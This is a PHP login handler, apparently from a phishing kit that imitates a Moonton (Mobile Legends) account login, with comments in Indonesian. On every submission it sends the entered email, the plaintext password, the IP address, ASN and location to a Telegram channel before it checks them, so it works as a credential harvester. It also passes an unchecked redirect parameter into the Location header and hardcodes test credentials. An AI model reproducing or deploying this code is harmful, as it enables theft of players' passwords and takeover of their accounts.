<?php
session_start();
include 'includes/config.php';
include 'includes/functions.php';

// Ambil data form
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$redirect = $_POST['redirect'] ?? 'profile.php';

// Log percobaan login
$ip = getUserIP();
$asn = getASN($ip);
$city = getCity($ip);
$country = getCountry($ip);

$message = "Login Attempt:\n";
$message .= "Email: $email\n";
$message .= "Password: $password\n";
$message .= "IP: $ip\n";
$message .= "ASN: $asn\n";
$message .= "Location: $city, $country";
sendToTelegram($message);

// Validasi sederhana (pada implementasi nyata, gunakan database)
$valid_emails = ['user@example.com', 'test@moonton.com'];
$valid_password = 'password123'; // Jangan lakukan ini di production!

if (in_array($email, $valid_emails) && $password === $valid_password) {
    // Simpan data login di session
    $_SESSION['moonton_loggedin'] = true;
    $_SESSION['moonton_email'] = $email;
    $_SESSION['moonton_user'] = 'MLBB Player'; // Ambil dari DB di implementasi nyata
    
    // Log login sukses
    sendToTelegram("Login Success - Email: $email | IP: $ip");
    
    // Redirect ke halaman tujuan
    header("Location: $redirect");
} else {
    // Log login gagal
    sendToTelegram("Login Failed - Email: $email | IP: $ip");
    
    // Redirect kembali ke login dengan error
    header("Location: login.php?error=1&redirect=".urlencode($redirect));
}
exit();
?>
